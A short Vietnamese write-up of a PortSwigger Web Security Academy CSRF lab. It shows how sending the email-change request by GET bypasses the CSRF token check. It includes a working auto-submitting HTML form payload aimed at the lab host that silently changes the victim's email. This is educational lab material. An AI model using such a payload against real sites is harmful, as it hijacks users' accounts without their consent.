![image](https://github.com/user-attachments/assets/bdc80391-3a2e-4205-975a-add2e9a40c21)

![image](https://github.com/user-attachments/assets/7b9f6048-d099-4b97-b37c-1368d31cc2a6)

Lần này thử update và bắt gói đó xem sao. WOW, nó đã có `csrf token` bảo vệ.

![image](https://github.com/user-attachments/assets/59c5c9d3-448e-400a-9e8f-2f47b0cb0a1b)

Tuy nhiên khi ta test lại với method `GET` thì ta lại thấy có sự khác biệt. Ta có thể gửi 1 request khi không có csrf token, tuy nhiên nó vẫn thành công.

Vậy mindsets bây giờ là chúng ta hãy gửi 1 auto submit form với `method GET`

Payload:

```
<html>
  <body>
    <form action="https://0a3600ee0397e1ed82403824007f00e2.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="clap@gmail.com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/8a9f2584-78eb-4b8d-a665-fb51252d1d52)

Vậy là thành công rồi đó.
